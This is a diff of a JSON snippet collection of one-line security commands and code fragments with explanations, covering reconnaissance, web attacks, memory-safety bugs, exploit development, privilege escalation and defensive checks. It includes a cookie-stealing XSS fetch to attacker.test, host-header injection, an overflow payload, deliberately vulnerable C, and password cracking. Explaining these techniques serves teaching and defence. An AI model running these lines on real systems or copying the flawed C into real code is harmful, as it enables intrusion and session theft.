@@ -1,24 +1,213 @@
 [
-  {"category":"hacking","language":"shell","attribution":"Recon","explanation":"A TCP SYN scan of the top 1000 ports. -sV asks each open port for its service banner, which is what turns a port list into a target list.","content":"nmap -sS -sV -T4 --top-ports 1000 10.0.0.0/24"},
-  {"category":"hacking","language":"shell","attribution":"Recon","explanation":"Resolves a wordlist of names against a domain. Subdomains are where forgotten staging boxes live.","content":"gobuster dns -d example.com -w /usr/share/wordlists/subdomains.txt -t 40"},
-  {"category":"hacking","language":"shell","attribution":"Recon","explanation":"Pulls every unique path a site references from its own JavaScript. Endpoints that no link points at are still endpoints.","content":"curl -s https://target/app.js | grep -oE '\"/[a-zA-Z0-9_/-]+\"' | sort -u"},
-  {"category":"hacking","language":"shell","attribution":"Web","attribution_note":"","explanation":"Directory brute force. -x tries extensions, so index.php.bak and config.old surface alongside directories.","content":"ffuf -u https://target/FUZZ -w wordlist.txt -e .php,.bak,.old -mc 200,301,403"},
-  {"category":"hacking","language":"shell","attribution":"Web","explanation":"Requests a path with an absolute URL to see whether the proxy in front trusts it. A different response here often means an internal service is reachable.","content":"curl -s -o /dev/null -w '%{http_code}' 'https://target/@internal/admin'"},
-  {"category":"hacking","language":"shell","attribution":"Web","explanation":"A header the application echoes back into a redirect or a password-reset link is a host header injection.","content":"curl -H 'X-Forwarded-Host: attacker.test' -s https://target/reset | grep -i location"},
-  {"category":"hacking","language":"clike","attribution":"Memory safety","explanation":"The classic overflow: strcpy writes until it finds a NUL, buf holds 64 bytes, and nothing checks which is larger.","content":"char buf[64]; strcpy(buf, argv[1]); /* no bound - argv[1] decides the write length */"},
-  {"category":"hacking","language":"clike","attribution":"Memory safety","explanation":"Freed then used. The allocator may hand that block to something else between the two lines, so the write lands in another object.","content":"free(ptr); ptr->next = head; /* use after free: the block may belong to someone else now */"},
-  {"category":"hacking","language":"clike","attribution":"Memory safety","explanation":"An attacker-controlled format string. Every %x walks the stack; %n writes to it.","content":"printf(user_input); /* format string bug - should be printf(\"%s\", user_input) */"},
-  {"category":"hacking","language":"python","attribution":"Exploit dev","explanation":"A cyclic pattern. Whatever four bytes end up in the instruction pointer tell you the exact offset to the return address.","content":"payload = b'A' * 72 + p64(0x401196) + p64(win_addr)"},
-  {"category":"hacking","language":"python","attribution":"Exploit dev","explanation":"Leaks a libc address from the GOT, then rebases every other libc symbol off it. This is how ASLR is worked around rather than defeated.","content":"libc.address = leak - libc.symbols['puts']"},
-  {"category":"hacking","language":"shell","attribution":"Crypto","explanation":"An MD5 of a known-weak hash type. Modern password hashing exists because this takes seconds, not years.","content":"hashcat -m 0 -a 0 hashes.txt rockyou.txt --force"},
-  {"category":"hacking","language":"shell","attribution":"Crypto","explanation":"Reads the certificate a host presents. Expiry dates and hostname mismatches are found here, not in a browser warning.","content":"openssl s_client -connect target:443 -servername target < /dev/null | openssl x509 -noout -text"},
-  {"category":"hacking","language":"shell","attribution":"Post-exploitation","explanation":"Finds setuid binaries. Anything unusual here runs as its owner no matter who executes it.","content":"find / -perm -4000 -type f 2>/dev/null"},
-  {"category":"hacking","language":"shell","attribution":"Post-exploitation","explanation":"Lists what the current user may run as root. A single entry with NOPASSWD is often the whole path to root.","content":"sudo -l 2>/dev/null | grep -E 'NOPASSWD|\\(ALL\\)'"},
-  {"category":"hacking","language":"shell","attribution":"Post-exploitation","explanation":"Upgrades a dumb shell to a real TTY, so job control, tab completion and su all start working.","content":"python3 -c 'import pty; pty.spawn(\"/bin/bash\")'"},
-  {"category":"hacking","language":"javascript","attribution":"Web","explanation":"A stored XSS payload that steals a session. HttpOnly on the cookie is what stops this line reading it.","content":"fetch('//attacker.test/?c=' + encodeURIComponent(document.cookie))"},
-  {"category":"hacking","language":"javascript","attribution":"Web","explanation":"Prototype pollution: writing through __proto__ reaches every object that inherits from it.","content":"JSON.parse('{\"__proto__\": {\"isAdmin\": true}}')"},
-  {"category":"hacking","language":"shell","attribution":"Defence","explanation":"Blocks everything inbound by default and allows what is needed back. A deny-by-default policy is the only kind worth writing.","content":"iptables -P INPUT DROP && iptables -A INPUT -m conntrack --ctstate ESTABLISHED,RELATED -j ACCEPT"},
-  {"category":"hacking","language":"shell","attribution":"Defence","explanation":"Watches authentication failures as they happen. Most intrusions are visible in logs long before they are noticed.","content":"journalctl -u sshd -f | grep -Ei 'failed|invalid user'"},
-  {"category":"hacking","language":"shell","attribution":"Defence","explanation":"Compares installed files against the package manager's own checksums. A changed system binary shows up here.","content":"pacman -Qkk 2>&1 | grep -v ' 0 altered files'"},
-  {"category":"hacking","language":"python","attribution":"Defence","explanation":"Constant-time comparison. A plain == returns early on the first differing byte, which leaks the answer through timing.","content":"if not hmac.compare_digest(expected_sig, provided_sig): raise ValueError('bad signature')"}
+  {
+    "category": "hacking",
+    "language": "shell",
+    "attribution": "Recon",
+    "explanation": "A TCP SYN scan of the top 1000 ports. -sV asks each open port for its service banner, which is what turns a port list into a target list.",
+    "content": "nmap -sS -sV -T4 --top-ports 1000 10.0.0.0/24"
+  },
+  {
+    "category": "hacking",
+    "language": "shell",
+    "attribution": "Recon",
+    "explanation": "Resolves a wordlist of names against a domain. Subdomains are where forgotten staging boxes live.",
+    "content": "gobuster dns -d example.com -w /usr/share/wordlists/subdomains.txt -t 40"
+  },
+  {
+    "category": "hacking",
+    "language": "shell",
+    "attribution": "Recon",
+    "explanation": "Pulls every unique path a site references from its own JavaScript. Endpoints that no link points at are still endpoints.",
+    "content": "curl -s https://target/app.js | grep -oE '\"/[a-zA-Z0-9_/-]+\"' | sort -u"
+  },
+  {
+    "category": "hacking",
+    "language": "shell",
+    "attribution": "Web",
+    "attribution_note": "",
+    "explanation": "Directory brute force. -x tries extensions, so index.php.bak and config.old surface alongside directories.",
+    "content": "ffuf -u https://target/FUZZ -w wordlist.txt -e .php,.bak,.old -mc 200,301,403"
+  },
+  {
+    "category": "hacking",
+    "language": "shell",
+    "attribution": "Web",
+    "explanation": "Requests a path with an absolute URL to see whether the proxy in front trusts it. A different response here often means an internal service is reachable.",
+    "content": "curl -s -o /dev/null -w '%{http_code}' 'https://target/@internal/admin'"
+  },
+  {
+    "category": "hacking",
+    "language": "shell",
+    "attribution": "Web",
+    "explanation": "A header the application echoes back into a redirect or a password-reset link is a host header injection.",
+    "content": "curl -H 'X-Forwarded-Host: attacker.test' -s https://target/reset | grep -i location"
+  },
+  {
+    "category": "hacking",
+    "language": "clike",
+    "attribution": "Memory safety",
+    "explanation": "The classic overflow: strcpy writes until it finds a NUL, buf holds 64 bytes, and nothing checks which is larger.",
+    "content": "char buf[64]; strcpy(buf, argv[1]); /* no bound - argv[1] decides the write length */"
+  },
+  {
+    "category": "hacking",
+    "language": "clike",
+    "attribution": "Memory safety",
+    "explanation": "Freed then used. The allocator may hand that block to something else between the two lines, so the write lands in another object.",
+    "content": "free(ptr); ptr->next = head; /* use after free: the block may belong to someone else now */"
+  },
+  {
+    "category": "hacking",
+    "language": "clike",
+    "attribution": "Memory safety",
+    "explanation": "An attacker-controlled format string. Every %x walks the stack; %n writes to it.",
+    "content": "printf(user_input); /* format string bug - should be printf(\"%s\", user_input) */"
+  },
+  {
+    "category": "hacking",
+    "language": "python",
+    "attribution": "Exploit dev",
+    "explanation": "A cyclic pattern. Whatever four bytes end up in the instruction pointer tell you the exact offset to the return address.",
+    "content": "payload = b'A' * 72 + p64(0x401196) + p64(win_addr)"
+  },
+  {
+    "category": "hacking",
+    "language": "python",
+    "attribution": "Exploit dev",
+    "explanation": "Leaks a libc address from the GOT, then rebases every other libc symbol off it. This is how ASLR is worked around rather than defeated.",
+    "content": "libc.address = leak - libc.symbols['puts']"
+  },
+  {
+    "category": "hacking",
+    "language": "shell",
+    "attribution": "Crypto",
+    "explanation": "An MD5 of a known-weak hash type. Modern password hashing exists because this takes seconds, not years.",
+    "content": "hashcat -m 0 -a 0 hashes.txt rockyou.txt --force"
+  },
+  {
+    "category": "hacking",
+    "language": "shell",
+    "attribution": "Crypto",
+    "explanation": "Reads the certificate a host presents. Expiry dates and hostname mismatches are found here, not in a browser warning.",
+    "content": "openssl s_client -connect target:443 -servername target < /dev/null | openssl x509 -noout -text"
+  },
+  {
+    "category": "hacking",
+    "language": "shell",
+    "attribution": "Post-exploitation",
+    "explanation": "Finds setuid binaries. Anything unusual here runs as its owner no matter who executes it.",
+    "content": "find / -perm -4000 -type f 2>/dev/null"
+  },
+  {
+    "category": "hacking",
+    "language": "shell",
+    "attribution": "Post-exploitation",
+    "explanation": "Lists what the current user may run as root. A single entry with NOPASSWD is often the whole path to root.",
+    "content": "sudo -l 2>/dev/null | grep -E 'NOPASSWD|\\(ALL\\)'"
+  },
+  {
+    "category": "hacking",
+    "language": "shell",
+    "attribution": "Post-exploitation",
+    "explanation": "Upgrades a dumb shell to a real TTY, so job control, tab completion and su all start working.",
+    "content": "python3 -c 'import pty; pty.spawn(\"/bin/bash\")'"
+  },
+  {
+    "category": "hacking",
+    "language": "javascript",
+    "attribution": "Web",
+    "explanation": "A stored XSS payload that steals a session. HttpOnly on the cookie is what stops this line reading it.",
+    "content": "fetch('//attacker.test/?c=' + encodeURIComponent(document.cookie))"
+  },
+  {
+    "category": "hacking",
+    "language": "javascript",
+    "attribution": "Web",
+    "explanation": "Prototype pollution: writing through __proto__ reaches every object that inherits from it.",
+    "content": "JSON.parse('{\"__proto__\": {\"isAdmin\": true}}')"
+  },
+  {
+    "category": "hacking",
+    "language": "shell",
+    "attribution": "Defence",
+    "explanation": "Blocks everything inbound by default and allows what is needed back. A deny-by-default policy is the only kind worth writing.",
+    "content": "iptables -P INPUT DROP && iptables -A INPUT -m conntrack --ctstate ESTABLISHED,RELATED -j ACCEPT"
+  },
+  {
+    "category": "hacking",
+    "language": "shell",
+    "attribution": "Defence",
+    "explanation": "Watches authentication failures as they happen. Most intrusions are visible in logs long before they are noticed.",
+    "content": "journalctl -u sshd -f | grep -Ei 'failed|invalid user'"
+  },
+  {
+    "category": "hacking",
+    "language": "shell",
+    "attribution": "Defence",
+    "explanation": "Compares installed files against the package manager's own checksums. A changed system binary shows up here.",
+    "content": "pacman -Qkk 2>&1 | grep -v ' 0 altered files'"
+  },
+  {
+    "category": "hacking",
+    "language": "python",
+    "attribution": "Defence",
+    "explanation": "Constant-time comparison. A plain == returns early on the first differing byte, which leaks the answer through timing.",
+    "content": "if not hmac.compare_digest(expected_sig, provided_sig): raise ValueError('bad signature')"
+  },
+  {
+    "category": "hacking",
+    "language": "shell",
+    "attribution": "Recon",
+    "explanation": "Certificate transparency logs list every name a CA has issued for a domain, including hosts that were never meant to be public.",
+    "content": "curl -s 'https://crt.sh/?q=%25.example.com&output=json' | jq -r '.[].name_value' | sort -u"
+  },
+  {
+    "category": "hacking",
+    "language": "shell",
+    "attribution": "Web",
+    "explanation": "Checks whether a session cookie carries the flags that stop JavaScript reading it and stop it crossing sites.",
+    "content": "curl -sI https://target/login | grep -i 'set-cookie' | grep -ci 'httponly.*secure'"
+  },
+  {
+    "category": "hacking",
+    "language": "shell",
+    "attribution": "Web",
+    "explanation": "Requests the same path twice with different cache-busting keys to see whether a proxy will serve one user's response to another.",
+    "content": "curl -s 'https://target/?x=1' -H 'X-Forwarded-Scheme: nothttps' -o /dev/null -w '%{http_code} %{time_total}\\n'"
+  },
+  {
+    "category": "hacking",
+    "language": "python",
+    "attribution": "Crypto",
+    "explanation": "A length-extension attack works because the hash's internal state is its output. HMAC exists precisely to stop this.",
+    "content": "forged = hashlib.sha256(secret_len * b'\\x00' + original + padding + suffix).hexdigest()"
+  },
+  {
+    "category": "hacking",
+    "language": "shell",
+    "attribution": "Post-exploitation",
+    "explanation": "Capabilities are finer-grained than setuid but grant real power. cap_setuid on an interpreter is root.",
+    "content": "getcap -r / 2>/dev/null | grep -E 'cap_(setuid|dac_override|sys_admin)'"
+  },
+  {
+    "category": "hacking",
+    "language": "shell",
+    "attribution": "Defence",
+    "explanation": "Audits which accounts can escalate, and how. The answer is usually longer than anyone expects.",
+    "content": "grep -rE '^[^#].*(ALL|NOPASSWD)' /etc/sudoers /etc/sudoers.d/ 2>/dev/null"
+  },
+  {
+    "category": "hacking",
+    "language": "shell",
+    "attribution": "Defence",
+    "explanation": "Compares running kernel modules against what the package manager installed. An unexpected module is worth explaining.",
+    "content": "lsmod | awk 'NR>1 {print $1}' | while read m; do modinfo -n \"$m\" 2>/dev/null; done | grep -v '^/lib/modules'"
+  },
+  {
+    "category": "hacking",
+    "language": "python",
+    "attribution": "Defence",
+    "explanation": "Parameterised queries send the values separately from the statement, so nothing the user types can become SQL.",
+    "content": "cur.execute('SELECT * FROM users WHERE name = %s AND active = %s', (name, True))"
+  }
 ]
